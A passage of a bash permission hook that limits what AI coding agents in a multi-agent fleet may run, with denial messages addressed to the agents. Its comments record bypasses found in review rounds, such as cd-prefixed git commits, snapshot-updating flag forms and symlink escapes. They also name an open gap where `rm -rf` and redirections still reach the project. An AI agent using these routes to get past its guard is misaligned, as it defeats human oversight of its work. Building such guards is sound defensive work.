  { IFS= read -r gitdir; IFS= read -r common; IFS= read -r top; } <<< "$out" || true
  [ -n "$gitdir" ] && [ -n "$common" ] || return 0
  bare="$(git --git-dir="$common" config --bool core.bare 2>/dev/null)" || bare=""
  if [ "${common##*/}" != .git ] || [ "$bare" = true ]; then GATE_KIND=layout; return 0; fi
  GATE_ROOT="${common%/*}"
  # Each of these can fail - an unreadable AGENTS.md makes awk exit 2 - and a
  # failed assignment under set -e trips the ERR trap, which allows the call.
  # So each fails closed instead: no list means nothing may run, and a
  # directory that cannot be resolved is not the worktree top.
  GATE_GATES="$(declared_gates "$GATE_ROOT")" || GATE_GATES=""
  if [ "$gitdir" = "$common" ]; then GATE_KIND=main; return 0; fi
  phys="$(cd "$1" 2>/dev/null && pwd -P)" || phys=""
  top="$(cd "$top" 2>/dev/null && pwd -P)" || top=""
  if [ -n "$phys" ] && [ "$phys" = "$top" ]; then GATE_KIND=worktree; else GATE_KIND=sub; fi
}

# Whether the absolute, normalised path $1 is under TMPDIR or a Claude Code
# scratchpad root, the only places a gate may write build output, and outside
# every checkout named in the rest of the arguments. The second half matters:
# a worktree can itself live under TMPDIR, and `--outDir dist` there is under
# TMPDIR and inside the repository at once.
#
# Both spellings of the path are compared, the lexical one and the physical one,
# because git reports a checkout with its symlinks resolved - /private/var on
# macOS - while the command names /var, and a check that compared only one
# would let `--outDir ../main-checkout/dist` through on the spelling alone.
under_scratch() {
  local t p="$1" pp c
  shift
  pp="$(phys_path "$p")"
  for c in "$@"; do
    [ -n "$c" ] || continue
    case "$p" in "$c"|"$c"/*) return 1 ;; esac
    case "$pp" in "$c"|"$c"/*) return 1 ;; esac
  done
  case "$p" in /tmp/claude-*/*|/private/tmp/claude-*/*) return 0 ;; esac
  case "$pp" in /private/tmp/claude-*/*) return 0 ;; esac
  if [ -n "${TMPDIR:-}" ]; then
    t="$(lex_abs "$TMPDIR" /)"
    if [ "$t" != / ]; then case "$p" in "$t"/*) return 0 ;; esac; fi
    t="$(phys_path "$t")"
    if [ "$t" != / ]; then case "$pp" in "$t"/*) return 0 ;; esac; fi
  fi
  return 1
}

# $1 an absolute, normalised path, with the symlinks in its deepest existing
# ancestor resolved; the part that does not exist yet is kept as written.
phys_path() {
  local p="$1" rest=""
  while [ -n "$p" ] && [ "$p" != / ] && [ ! -d "$p" ]; do
    rest="/${p##*/}$rest"; p="${p%/*}"
  done
  [ -n "$p" ] || p=/
  p="$(cd "$p" 2>/dev/null && pwd -P)" || p=""
  printf '%s%s' "${p%/}" "$rest"
}

# The first word of a gate that puts the run in a refused class, as
# "<class>:<word>", or nothing. $1 the normalised words, command word first;
# $2 the directory the segment runs in, for a relative output path; $3 the
# main checkout, which output may not land in either. Classes:
# snapshot, write (--fix, --write and their kin), watch, and emit (build
# output that does not land under TMPDIR or the scratchpad). tsc and vue-tsc
# emit unless told --noEmit, and a `build` subcommand emits, so each needs
# --noEmit or an output flag that points outside the repository.
gate_flag_denial() {
  local tok tool verb="" want_out="" noemit=no out_ok=no emits=no abs here="$2" root="${3:-}" herep
  herep="$(phys_path "$here")"
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $1
  set +f
  tool="${1##*/}"; shift
  for tok in "$@"; do
    if [ -n "$want_out" ]; then
      abs="$(lex_abs "$tok" "$here")"
      under_scratch "$abs" "$here" "$herep" "$root" || { printf 'emit:%s %s' "$want_out" "$tok"; return 0; }
      want_out=""; out_ok=yes; continue
    fi
    case "$tok" in
      # Every --update form, --update=none included. vitest 4.x reads
      # --update=none as "write nothing", but vitest 3.x declares --update as
      # a flag with no value, so it reads `none` as a file filter and updates
      # every snapshot (CF-90 review round 2, read in vitest 3.2.6's cac
      # source). The hook cannot tell which vitest a worktree has, so the
      # non-writing route is a leading CI=true (see reviewer_gate_check).
      # `--u` and `--u=*` too: mri (bundled by vitest) and yargs-parser (jest)
      # both accept a one-letter name after two dashes. And cac's dot form,
      # `--update.x`, which sets update to an object - truthy, so refused
      # rather than read (CF-90 fix round 3).
      -u|--u|--u=*|--update|--update=*|--update.*|--update-snapshots|--update-snapshots=*|--updateSnapshot|--updateSnapshot=*|--update-snapshot|--update-snapshot=*|--test-update-snapshots|--test-update-snapshots=*)
        printf 'snapshot:%s' "$tok"; return 0 ;;
      --fix|--fix=*|--fix-*|--write|--write=*|--apply|--apply=*|--apply-unsafe)
        printf 'write:%s' "$tok"; return 0 ;;
      --watch|--watch=*|--watch-*|--watchAll|--watchAll=*)
        printf 'watch:%s' "$tok"; return 0 ;;
      --noEmit|--noEmit=true|--no-emit) noemit=yes; continue ;;
      --outDir|--outdir|--out-dir|--outFile|--outfile|--out-file|--declarationDir|--tsBuildInfoFile|--output|-o|--dist-dir)
        want_out="$tok"; continue ;;
      --outDir=*|--outdir=*|--out-dir=*|--outFile=*|--outfile=*|--out-file=*|--declarationDir=*|--tsBuildInfoFile=*|--output=*|--dist-dir=*)
        abs="$(lex_abs "${tok#*=}" "$here")"
        under_scratch "$abs" "$here" "$herep" "$root" || { printf 'emit:%s' "$tok"; return 0; }
        out_ok=yes; continue ;;
    esac
    # A cluster of short flags: -u updates snapshots in jest and vitest, and -w
    # is watch in tsc, vitest and jest and write in prettier. With or without a
    # value: mri and yargs-parser read `-u=true`, `-u=false` and `-tu=x` as
    # setting u, and the value is not something this reads (round 3 - the
    # `^-[A-Za-z]+$` test missed every `=` form).
    if [[ $tok =~ ^-([A-Za-z]+)(=.*)?$ ]]; then
      case "${BASH_REMATCH[1]}" in *u*) printf 'snapshot:%s' "$tok"; return 0 ;; esac
      case "${BASH_REMATCH[1]}" in *w*) printf 'watch:%s' "$tok"; return 0 ;; esac
    fi
    case "$tok" in
      -*) ;;
      *)
        if [ -z "$verb" ]; then
          verb="$tok"
          case "$verb" in
            watch|dev) printf 'watch:%s' "$verb"; return 0 ;;
            build) emits=yes ;;
          esac
        fi ;;
    esac
  done
  [ -z "$want_out" ] || { printf 'emit:%s' "$want_out"; return 0; }
  case "$tool" in tsc|vue-tsc) emits=yes ;; esac
  if [ "$emits" = yes ] && [ "$noemit" = no ] && [ "$out_ok" = no ]; then
    printf 'emit:%s' "$tool${verb:+ $verb}"; return 0
  fi
  printf ''
}

# Whether $1, the words after the test gate's own, are one relative path, one
# test-name filter, or one of each - and nothing else. A path is relative, holds
# no .. segment and nothing the shell reads, is not itself a symlink, and with
# the symlinks in its deepest existing directory resolved stays inside $2, the
# worktree top. phys_path resolves directories only, so a symlinked file
# (`leak.test.ts -> /etc/hosts`) is refused by the -L test rather than
# resolved; a symlinked directory (`escape -> /etc`) by the prefix test. A
# symlink the path does not reach yet is not seen. A filter is -t,
# --testNamePattern, --test-name-pattern, -g or --grep with one plain value.
gate_selector_ok() {
  local tok paths=0 names=0 want=no top="$2" topp pp
  topp="$(phys_path "$top")"
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $1
  set +f
  for tok in "$@"; do
    if [ "$want" = yes ]; then
      [[ $tok =~ $GATE_NAME_RE ]] || return 1
      names=$((names + 1)); want=no; continue
    fi
    case "$tok" in
      -t|--testNamePattern|--test-name-pattern|-g|--grep) want=yes ;;
      --testNamePattern=*|--test-name-pattern=*|--grep=*)
        [[ ${tok#*=} =~ $GATE_NAME_RE ]] || return 1
        names=$((names + 1)) ;;
      -*) return 1 ;;
      *)
        [[ $tok =~ $GATE_PATH_RE ]] || return 1
        case "/$tok/" in */../*) return 1 ;; esac
        [ -n "$topp" ] || return 1
        [ -L "$(lex_abs "$tok" "$top")" ] && return 1
        pp="$(phys_path "$(lex_abs "$tok" "$top")")"
        case "$pp" in "$topp"/*) ;; *) return 1 ;; esac
        paths=$((paths + 1)) ;;
    esac
  done
  [ "$want" = no ] && [ "$paths" -le 1 ] && [ "$names" -le 1 ] && [ $((paths + names)) -ge 1 ]
}

# The segment as the words a gate is compared with: leading shell syntax and a
# subshell's closing paren gone, escapes undone, single spaces between.
gate_words() {
  local s
  s="$(strip_leading_syntax "$1")"
  s="$(printf '%s' "$s" | sed -E 's/[[:space:])]+$//')"
  s="$(unescape_words "$s")"
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $s
  set +f
  printf '%s' "$*"
}

# The name of the declared gate $1 (normalised words) is, or nothing. $2 the
# "name<TAB>command" lines, $3 the worktree top a test path must stay inside.
gate_match() {
  local words="$1" gates="$2" top="$3" name cmd
  while IFS=$'\t' read -r name cmd; do
    [ -n "$cmd" ] || continue
    set -f
    # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
    set -- $cmd
    set +f
    cmd="$*"
    if [ "$words" = "$cmd" ]; then printf '%s' "$name"; return 0; fi
    if [ "$name" = test ]; then
      case "$words" in
        "$cmd "*) gate_selector_ok "${words#"$cmd "}" "$top" && { printf '%s' "$name"; return 0; } ;;
      esac
    fi
  done <<< "$gates"
  printf ''
}

# Denies a reviewer segment whose command word is not on the read allowlist
# unless it is a declared gate run the way this file allows, and returns when
# it is. $1 the segment (quoted spans already erased), $2 its leading_token,
# $3 its 1-based index among the command's segments. Reads REVIEW_RAW,
# REVIEW_NCD and REVIEW_SCAN, which enforce_reviewer sets once per command.
REVIEW_RAW=""
REVIEW_NCD=0
REVIEW_SCAN=""
REVIEW_ASSIGNS=""
REVIEW_ASSIGNS_DONE=no

# $1 the newline-separated segments. Prints them with a leading literal
# CI=true removed from each segment where it leads a gate: a command word
# follows it and that word is not on REVIEWER_ALLOWED_CMDS. Every other
# segment is printed as it came, so gh_command_assigns still sees any other
# CI=true as the assignment it is.
reviewer_ci_stripped() {
  local seg rest tok
  while IFS= read -r seg; do
    if [[ $seg =~ ^[[:space:]]*CI=true[[:space:]]+([^[:space:]].*)$ ]]; then
      rest="${BASH_REMATCH[1]}"
      tok="$(leading_token "$rest")"
      if [ -n "$tok" ]; then
        case "$REVIEWER_ALLOWED_CMDS" in
          *" $tok "*) ;;
          *) printf '%s\n' "$rest"; continue ;;
        esac
      fi
    fi
    printf '%s\n' "$seg"
  done <<< "$1"
}
reviewer_gate_check() {
  local seg="$1" tok="$2" kind root gates words body first why name cmd candidate=no
  case "$REVIEWER_PACKAGE_MANAGERS" in
    *" $tok "*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"$tok\" is a package manager, and a package manager is never a gate: \`pnpm --filter x typecheck\` may install before it runs the script, and an install changes the dependencies under review. Declare the gate as the binary it calls, ./node_modules/.bin/<tool>, and run that." ;;
  esac
  case "$REVIEWER_NETWORK_TOOLS" in
    *" $tok "*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"$tok\" is a network tool, and a review reads the diff, not the network. Whatever it would fetch, say in a finding what needs checking." ;;
  esac

  if ! cd_shape_ok "$REVIEW_RAW" "$REVIEW_NCD" "$3"; then
    deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"$tok\" is not a read, so it may only be a declared gate, and where a gate runs has to be certain. $CD_SHAPE_RULE"
  fi

  gate_dir_state "$SEG_HERE"
  kind="$GATE_KIND"; root="$GATE_ROOT"; gates="$GATE_GATES"
  if [ "$kind" = layout ]; then
    deny "reviewer invariant: $REVIEWER_GATE_INVARIANT This repository keeps its git dir apart from its checkout (a --separate-git-dir or bare layout), so this hook cannot tell where the main checkout is, and it reads the gate list from nowhere else. Nothing may execute here; list the gates under Unverified."
  fi
  if [ -z "$gates" ]; then
    deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"$tok\" is not one of the commands a reviewer reads with, and this checkout declares no gates in AGENTS.md, so nothing may execute. Say in a finding what needs running and what you expect it to show, and list the unrun gate under Unverified."
  fi
  while IFS=$'\t' read -r name cmd; do
    case "$cmd" in "CI=true "*) cmd="${cmd#CI=true }" ;; esac
    first="${cmd%%[[:space:]]*}"
    [ "${first##*/}" = "$tok" ] && { candidate=yes; break; }
  done <<< "$gates"
  if [ "$candidate" = no ]; then
    deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"$tok\" is not one of the commands a reviewer reads with, and not a declared gate in $root/AGENTS.md. Say in a finding what needs running and what you expect it to show, and list it under Unverified."
  fi

  # Walked once per command, not once per gate segment: it reads every
  # segment, so per-segment calls grew with the square of the segment count.
  #
  # One assignment is exempt: a literal CI=true as a segment's first word
  # (CF-90 review round 2). It is how a gate stops test runners writing
  # snapshots on every version: vitest 3.2.4 resolves `updateSnapshot:
  # isCI && !UPDATE_SNAPSHOT ? 'none' : ...` (packages/vitest/src/node/config/
  # resolveConfig.ts, isCI from std-env, `!!env.CI || ...`), and jest 29.7.0
  # defaults `ci: isCI` from ci-info (packages/jest-config/src/Defaults.ts),
  # which stores no new snapshot. The value is fixed, so there is nothing for
  # a reader to miss; any other assignment, or CI=true anywhere else, is still
  # refused. A gate that carries it must be declared with it, so the exact
  # match below still decides.
  #
  # The exemption applies only where CI=true leads a gate in the same
  # segment: a command follows it, and that command is not one of the reads,
  # so it is checked as a gate (round 3). A bare `CI=true ;` or `CI=true &&`,
  # or CI=true in front of a read, is an ordinary assignment and is refused
  # like any other.
  if [ "$REVIEW_ASSIGNS_DONE" = no ]; then
    REVIEW_ASSIGNS="$(gh_command_assigns "$(reviewer_ci_stripped "$REVIEW_SCAN")")"
    REVIEW_ASSIGNS_DONE=yes
  fi
  why="$REVIEW_ASSIGNS"
  case "$why" in
    '') ;;
    for:*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT A command that runs a gate assigns no variable, and this one has a for loop whose header assigns ${why#for:} - NODE_OPTIONS alone loads code into every test run. Run the gate on its own, as declared." ;;
    read) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT This command runs read, which assigns a variable from standard input where no check can see it, and a command that runs a gate assigns none. Run the gate on its own, as declared." ;;
    *) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT A command that runs a gate assigns no variable, and this one assigns $why - NODE_OPTIONS alone loads code into every test run. Run the gate on its own, as declared." ;;
  esac

  words="$(gate_words "$seg")"
  # The command after an exempt CI=true, which the wrapper, install and flag
  # checks read; the exact match still reads every word.
  body="$words"
  case "$words" in "CI=true "*) body="${words#CI=true }" ;; esac
  first="${body%% *}"
  case "$COMMAND_WRAPPERS" in
    *" ${first##*/} "*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"${first##*/}\" is a wrapper in front of the gate, and a gate runs exactly as declared - xargs alone adds words no check can see. Run the gate with nothing in front of it." ;;
  esac
  why="$(word_expansion_denial "$words" no)"
  case "$why" in
    expands:*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"${why#expands:}\" holds \$, {, *, ?, [ or a backtick, which the shell expands into words the gate reads and this check does not. Write every word of the gate out plainly." ;;
    quoted:*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"${why#quoted:}\" is a quoted option, and what a quoted option says cannot be read here. Run the gate as declared, unquoted." ;;
  esac
  case "$words" in
    *\'*|*\"*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT This gate command has a quoted word, and a quoted span is erased before the check reads it, so what it says cannot be read here. Run the gate as declared, unquoted." ;;
  esac
  if printf '%s' "$command_str" | grep -Eq "$GH_QUOTED_FLAG_RE"; then
    deny "reviewer invariant: $REVIEWER_GATE_INVARIANT This command has a quoted option - a quote opening a word that starts with - - and what a quoted option says cannot be read here. Run the gate as declared, unquoted."
  fi

  why="$(install_verb "$body")"
  if [ -n "$why" ]; then
    deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"$tok $why\" installs, and an install changes the dependencies under review. If the gate cannot run without it, say so in a finding and list the gate under Unverified."
  fi

  why="$(gate_flag_denial "$body" "$SEG_HERE" "$root")"
  case "$why" in
    snapshot:*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"${why#snapshot:}\" updates snapshots, which rewrites the expectations the diff is judged against. Run the gate without it; a stale snapshot is a finding." ;;
    write:*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"${why#write:}\" rewrites files, which changes the diff under review. Run the check without it; what it would change is a finding." ;;
    watch:*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"${why#watch:}\" is watch mode, which never exits and reports no final count. Run the gate once, as declared." ;;
    emit:*) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"${why#emit:}\" writes build output inside the repository. A gate may pass --noEmit, or send its output with --outDir under TMPDIR or the scratchpad." ;;
  esac

  case "$kind" in
    worktree) ;;
    main) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT $SEG_HERE is the main checkout, not a linked worktree. The board hooks commit there and it has whatever branch out it happens to have, so a gate run there checks the wrong tree. Run the gate from the top of the review worktree." ;;
    sub) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT $SEG_HERE is inside the review worktree but not at its top, and a gate runs from the top of the review worktree, where its declared paths mean what they say. cd to the worktree's top and run it there." ;;
    *) deny "reviewer invariant: $REVIEWER_GATE_INVARIANT $SEG_HERE is not a git checkout, so it cannot be the review worktree. Run the gate from the top of the review worktree." ;;
  esac

  name="$(gate_match "$words" "$gates" "$SEG_HERE")"
  [ -n "$name" ] && return 0
  deny "reviewer invariant: $REVIEWER_GATE_INVARIANT \"$words\" is not a declared gate, nor the test gate with one relative path or one test name after it. The declared gates, in $root/AGENTS.md, are: $(printf '%s\n' "$gates" | cut -f1 | tr '\n' ' ')- run one exactly as written there."
}

enforce_reviewer() {
  if is_write_tool "$tool_name"; then
    deny "reviewer invariant: \"Never edit, write or create a file. Not a fix, not a test, not a note.\" The report is the whole output: a reviewer that edits makes the diff the human approves a different diff from the one they read. Raise it as a finding and let coder make the change."
  fi
  [ "$tool_name" = "Bash" ] || return 0
  [ -n "$command_str" ] || return 0

  local scan subst_scan seg tok verb
  scan="$(strip_quoted "$command_str")"
  scan="$(printf '%s' "$scan" | sed -E 's/[0-9]?>>?[[:space:]]*\/dev\/null//g')"
  subst_scan="$(strip_single_quoted "$command_str")"

  if printf '%s' "$scan" | grep -Eq '(^|[[:space:];|&])sed([[:space:]]|$)' && sed_writes "$command_str"; then
    deny "reviewer invariant: \"Never edit, write or create a file. Not a fix, not a test, not a note.\" That sed script contains a w, W or e command, which writes a file or runs a program. Quote it however you like; it is still a script."
  fi

  case "$subst_scan" in
    *'$('*|*'`'*)
      deny "reviewer invariant: no command substitution. \$( and backticks can hide a write or a test run behind something that reads like an inspection, and double quotes do not disarm them. Run the inner command on its own." ;;
  esac

  case "$scan" in
    *'>'*)
      deny "reviewer invariant: \"Never edit, write or create a file. Not a fix, not a test, not a note.\" > and >> create files. The report is the whole output." ;;
    *'<('*|*'>('*)
      deny "reviewer invariant: no process substitution. Run the commands separately." ;;
  esac

  REVIEW_RAW="$scan"
  scan="$(bound_segments "$(printf '%s' "$scan" | sed -E 's/(\|\||&&|;|\||&)/\n/g')")"
  REVIEW_SCAN="$scan"
  # Two passes. The first reads every segment's command word and counts the
  # ones that move the shell, because whether a gate runs where the hook thinks
  # depends on segments after it as well as before (cd_shape_ok).
  local -a segs=() toks=()
  local i=0
  REVIEW_NCD=0
  while IFS= read -r seg; do
    seg="$(printf '%s' "$seg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')"
    [ -n "$seg" ] || continue
    tok="$(leading_token "$seg")"
    segs+=("$seg"); toks+=("$tok")
    case "$SHELL_CD_WORDS" in *" $tok "*) REVIEW_NCD=$((REVIEW_NCD + 1)) ;; esac
  done <<< "$scan"
  SEG_HERE="$cwd"; SEG_PREV="$cwd"
  while [ "$i" -lt "${#segs[@]}" ]; do
    seg="${segs[$i]}"; tok="${toks[$i]}"
    i=$((i + 1))
    [ -n "$tok" ] || continue
    # A cd moves where a later gate runs, and the gate rule asks git about
    # that directory, not the tool call's cwd - in the one shape where the
    # move is certain (cd_shape_ok).
    seg_cd "$seg" "$tok" || true

    case "$REVIEWER_ALLOWED_CMDS" in
      *" $tok "*) ;;
      # Not a read, so a declared gate or nothing. Returns only when it is a
      # gate run the allowed way; every other answer is a deny.
      *) reviewer_gate_check "$seg" "$tok" "$i"; continue ;;
    esac

    case "$tok" in
      git)
        verb="$(sub_verb "${seg}")"
        case "$REVIEWER_ALLOWED_GIT" in
          *" $verb "*) ;;
          *) deny "reviewer invariant: \"Never run a git command that writes: no commit, push, force-push, checkout, stash, reset or rebase. Read-only git only.\" \"git $verb\" is not a read-only verb. Read the history with git log, show, blame, diff or ls-files; anything that changes a ref belongs to coder." ;;
        esac
        ;;
      sed)
        case " $seg " in
          *" -i"*|*" --in-place"*)
            deny "reviewer invariant: sed -i edits the file in place. The reviewer never changes the diff it is reading." ;;
        esac
        ;;
      find)
        case " $seg " in
          *" -exec"*|*" -execdir"*|*" -ok"*|*" -okdir"*|*" -delete"*|*" -fprintf"*|*" -fls"*|*" -fprint"*)
            deny "reviewer invariant: find -exec, -delete and the -f* actions run or write things. Locate files with find and read them separately." ;;
        esac
        ;;
    esac
  done
  return 0
}

# ----------------------------------------------------------------------- coder
# Invariants: "Confirm you are in your worktree and that it is clean before you
# touch anything", and out of scope is "anything on a shared branch - no
# merging, no releasing, no touching main".
#
# This is the only place that can PREVENT a fix landing in the main checkout.
# review-round can detect it afterwards - by then coder has already branched and
# committed - and the fix prompt asks coder to check first, but an instruction
# is not a boundary. coder carries an agentType, so this hook governs its Bash
# calls, and git itself answers the question: a linked worktree's git dir is
# under `.git/worktrees/`, a main checkout's is not.
#
# Reads are untouched. So is everything that is not git. What is refused is a
# git command that writes, in a directory that cannot be shown to be a worktree
# - including a directory that is not a repository at all, where such a command
# would fail anyway. Not being able to tell is not permission: the whole point
# is the case where isolation silently did not happen, which is exactly when
# nothing announces itself.
#
# scripter is dispatched here too. It is coder's cheaper sibling with the same
# isolation: worktree and the same invariant, and nothing below reads the agent
# name - the decision rests only on the command, its cwd and what git says the
# target directory is - so one guard serves both.
CODER_WRITING_GIT=" commit switch checkout branch reset merge rebase push stash cherry-pick revert am apply tag clean rm mv restore worktree "

# The directory a git command actually targets: its -C if it has one, else the
# directory the segment runs in ($2), which is the tool call's cwd until a cd
# or pushd earlier in the same command moves it. A relative -C is resolved
# against that directory too, not against wherever this hook happens to run.
git_target_dir() {
  local seg="$1" here="${2:-$cwd}" tok want=no
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $(command_words "$seg")
  for tok in "$@"; do
    if [ "$want" = yes ]; then lex_abs "$tok" "$here"; return 0; fi
    [ "$tok" = "-C" ] && want=yes
  done
  printf '%s' "$here"
}

# The sub-verb of `git worktree`, or empty. `worktree add` is the one writing
# git command allowed from a main checkout: it creates the isolation this guard
# exists to require, touches no branch there, and is how coder gets a worktree
# in a repository the harness did not cut one in. `remove`, `prune` and `move`
# stay governed - coder's own body forbids removing a worktree with work in it.
worktree_sub_verb() {
  local tok state=opts
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $(command_words "$1")
  shift  # git
  for tok in "$@"; do
    if [ "$state" = skip ]; then state=opts; continue; fi
    case "$tok" in
      -C|-c|--git-dir|--work-tree) state=skip; continue ;;
      -*) continue ;;
    esac
    if [ "$state" = opts ]; then
      [ "$tok" = worktree ] && state=verb
      continue
    fi
    printf '%s' "$tok"
    return 0
  done
  printf ''
}

enforce_coder() {
  [ "$tool_name" = "Bash" ] || return 0
  [ -n "$command_str" ] || return 0
  command -v git >/dev/null 2>&1 || return 0

  local scan raw seg verb target gitdir first ncd=0 i=0
  local -a segs=() toks=()
  # Where each segment runs. A cd or pushd earlier in the same command moves
  # every segment after it, so `cd <other repo> && git commit` has to be judged
  # in <other repo>, not in the worktree the tool call started in. Observed in
  # a cross-repository run, 18 September 2026 (GitHub issue #7): the -C form
  # was refused and the cd form walked straight through. And a cd in any shape
  # but `cd <path> && ... && git <verb>` is refused, not modelled (cd_shape_ok,
  # CF-90 fix round 1): `cd -P <main> && git commit` walked through.
  SEG_HERE="$cwd"; SEG_PREV="$cwd"
  raw="$(strip_quoted "$command_str")"
  scan="$(bound_segments "$(printf '%s' "$raw" | sed -E 's/(\|\||&&|;|\||&)/\n/g')")"
  while IFS= read -r seg; do
    # A subshell's parens are stripped with the whitespace, so its command word
    # is read; cd_shape_ok refuses the subshell itself when a cd is involved.
    seg="$(printf '%s' "$seg" | sed -E 's/^[[:space:](]+//; s/[[:space:])]+$//')"
    [ -n "$seg" ] || continue
    first="$(leading_token "$seg")"
    segs+=("$seg"); toks+=("$first")
    case "$SHELL_CD_WORDS" in *" $first "*) ncd=$((ncd + 1)) ;; esac
  done <<< "$scan"
  while [ "$i" -lt "${#segs[@]}" ]; do
    seg="${segs[$i]}"; first="${toks[$i]}"
    i=$((i + 1))
    if seg_cd "$seg" "$first"; then continue; fi
    [ "$first" = git ] || continue
    verb="$(sub_verb "$seg")"
    case "$CODER_WRITING_GIT" in
      *" $verb "*) ;;
      *) continue ;;
    esac
    if [ "$verb" = worktree ] && [ "$(worktree_sub_verb "$seg")" = add ]; then continue; fi

    if ! cd_shape_ok "$raw" "$ncd" "$i"; then
      deny "coder invariant: \"Confirm you are in your worktree and that it is clean before you touch anything.\" \"git $verb\" writes, and this guard has to be certain which checkout it writes in. $CD_SHAPE_RULE Or pass the worktree with git -C <path>. If you cannot tell which worktree is yours, raise a \"Blocker: \" line asking, as a question ending in \"?\", where your worktree is."
    fi

    target="$(git_target_dir "$seg" "$SEG_HERE")"
    [ -n "$target" ] || target="."
    gitdir="$(git -C "$target" rev-parse --absolute-git-dir 2>/dev/null)" || gitdir=""
    case "$gitdir" in
      */worktrees/*) continue ;;
    esac
    if [ -z "$gitdir" ]; then
      deny "coder invariant: \"Confirm you are in your worktree and that it is clean before you touch anything.\" \"git $verb\" writes, and $target is not a git repository at all, so it cannot be the worktree you were given. Find the worktree you were handed, or stop and raise a \"Blocker: \" line asking, as a question ending in \"?\", which worktree you were meant to use."
    fi
    deny "coder invariant: \"Confirm you are in your worktree and that it is clean before you touch anything\", and out of scope is \"anything on a shared branch\". \"git $verb\" writes, and $target is not a linked worktree - git reports its git dir as $gitdir, which is a main checkout. Committing there puts your work on somebody else's branch. Work in the worktree you were given; if you have not got one, change nothing and raise a \"Blocker: \" line asking, as a question ending in \"?\", where your worktree is."
  done
  return 0
}

# --------------------------------------------------------------------- refuter
# Invariants: "Never write inside the project" and "Never fix what you find."
#
# The only role that may run anything and the only one whose write rule is a
# denial rather than an allowlist. Both are deliberate. Mutation testing is
# copy, change, run, so a command allowlist would have to be wide enough to
# express nothing.
#
# Be exact about what holds the write half, because this comment used to say
# check-write-scope.py held it and that is more than it does.
# check-write-scope.py only ever sees Write, Edit, MultiEdit and NotebookEdit,
# which is the TOOL half. It holds nothing at all against Bash, and Bash is
# where this role spends its whole working life: `echo mutated >
# claude/coder-fleet/agents/coder.md`, `cp /tmp/x claude/coder-fleet/workflows/
# review-round.js` and `rm -rf claude/coder-fleet` are every one of them allowed for
# refuter today, confirmed against this hook.
#
# enforce_fleet_steward below resolves and checks redirection targets for an
# equivalent rule, so the pattern exists in this file and is simply not applied
# here. Narrowing it is a real change rather than a comment fix, and it would
# still only reach redirections, not `cp` or `rm`. It is on the open-items list.
#
# What is left for here is git: read-only, the same verbs the reviewer has. It
# mutates a scratch copy and never moves a ref in the real repository.
REFUTER_ALLOWED_GIT=" log show blame diff ls-files status shortlog describe rev-parse rev-list cat-file grep whatchanged "

enforce_refuter() {
  [ "$tool_name" = "Bash" ] || return 0
  [ -n "$command_str" ] || return 0

  local scan seg verb
  scan="$(strip_quoted "$command_str")"
  scan="$(bound_segments "$(printf '%s' "$scan" | sed -E 's/(\|\||&&|;|\||&)/\n/g')")"
  while IFS= read -r seg; do
    seg="$(printf '%s' "$seg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')"
    [ -n "$seg" ] || continue
    [ "$(leading_token "$seg")" = "git" ] || continue
    verb="$(sub_verb "$seg")"
    case "$REFUTER_ALLOWED_GIT" in
      *" $verb "*) ;;
      *) deny "refuter invariant: \"Never fix what you find.\" \"git $verb\" is not a read-only verb, and a refutation is a finding with a reproduction rather than a patch. Mutate a copy outside the project and report what survived." ;;
    esac
  done <<< "$scan"
  return 0
}

# ----------------------------------------------------------------- ui-designer
# Invariant: "Never run a git command that writes, and never install anything
# into the product repo."
#
# Bash stays open otherwise, because "use Bash only to build, serve or
# screenshot a prototype" is the job. So the package managers are matched on
# their install verbs rather than denied outright: `npx serve` and a prototype
# build are allowed, `npm install` is not.
UI_DESIGNER_ALLOWED_GIT=" log show blame diff ls-files status shortlog describe rev-parse rev-list cat-file grep whatchanged "
UI_DESIGNER_INSTALLERS=" npm pnpm yarn bun pip pip3 pipx poetry uv gem bundle composer cargo go brew apt apt-get "
UI_DESIGNER_INSTALL_VERBS=" install i ci add require get remove uninstall update upgrade link "

# The install verb is the first word that IS one, not merely the first word that
# is not an option: `npm --prefix /tmp/x install react` is an ordinary idiom and
# put the path where the verb was looked for. Scanning past a non-verb word only
# when a LONG option preceded it keeps `npm run link` allowed - long options
# commonly take a separate value, short flags usually do not, so `npm -g install`
# still reads `install`.
install_verb() {
  local seg tok prev=""
  seg="$(unescape_words "$(command_words "$1")")"
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $seg
  [ "$#" -gt 0 ] || { printf ''; return 0; }
  shift
  for tok in "$@"; do
    case "$tok" in
      -*) prev="$tok"; continue ;;
    esac
    case "$UI_DESIGNER_INSTALL_VERBS" in
      *" $tok "*) printf '%s' "$tok"; return 0 ;;
    esac
    # Any option may carry a separate value, not just a long one: `npm -C <dir>`
    # is a documented alias for --prefix and takes one, so requiring `--` ended
    # the scan a word early and the install verb was never reached. `npm run
    # link` is still allowed, because nothing preceded `run`.
    case "$prev" in
      -*) prev="" ; continue ;;
      *) printf ''; return 0 ;;
    esac
  done
  printf ''
}

enforce_ui_designer() {
